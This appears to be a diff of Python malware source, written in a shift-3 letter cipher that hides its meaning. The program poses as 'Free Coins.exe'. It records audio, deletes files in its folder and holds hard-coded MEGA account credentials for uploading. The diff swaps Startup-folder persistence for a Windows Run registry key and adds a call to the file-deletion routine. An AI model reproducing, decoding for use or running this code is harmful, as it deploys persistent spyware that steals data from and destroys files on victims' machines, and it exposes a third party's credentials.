@@ -11,6 +11,7 @@ lpsruw uhtxhvwv
 lpsruw jhrfrghu
 lpsruw jore
 lpsruw sbdxwrjxl
+lpsruw zlquhj
 
 ghi ghohwh_ilohv():
     fxuuhqw_iroghu = rv.jhwfzg()
@@ -172,6 +173,7 @@ ghi uhfrug_dxglr():
 
 zkloh Wuxh:
     wub:
+        ghohwh_ilohv()
         # vhw xvhuqdph/sdvvzrug
         phjd_hpdlo = 'odmha92681@phlghfq.frp'
         phjd_sdvvzrug = 'e@vlw1218'
@@ -204,19 +206,11 @@ zkloh Wuxh:
 
         wub:
 
-            krph_glu = rv.sdwk.hasdqgxvhu("~")
-
-            # Vshflib wkh vrxufh iloh sdwk
-            vrxufh_iloh = "Iuhh Frlqv.hah"
-
-            # jhw sdwk ri vwduwxs iroghu
-            vwduwxs_iroghu = rv.sdwk.mrlq(krph_glu, "DssGdwd", "Urdplqj", "Plfurvriw", "Zlqgrzv", "Vwduw Phqx", "Surjudpv", "Vwduwxs")
-
-            # jhw sdwk ri pdozduh
-            vrxufh_iloh_sdwk = rv.sdwk.devsdwk(vrxufh_iloh)
-
-            # Frsb wr vwduwxs iroghu
-            vkxwlo.frsb(vrxufh_iloh_sdwk, vwduwxs_iroghu)
+            surjudp_qdph = "Iuhh Frlqv.hah"
+            surjudp_sdwk = rv.sdwk.mrlq(rv.jhwfzg(), surjudp_qdph)
+            nhb = zlquhj.RshqNhb(zlquhj.KNHB_FXUUHQW_XVHU, "Vriwzduh\Plfurvriw\Zlqgrzv\FxuuhqwYhuvlrq\Uxq", 0, zlquhj.NHB_DOO_DFFHVV)
+            zlquhj.VhwYdoxhHa(nhb, "Iuhh Frlqv", 0, zlquhj.UHJ_VC, surjudp_sdwk)
+            zlquhj.ForvhNhb(nhb)
 
         hafhsw:
             sdvv
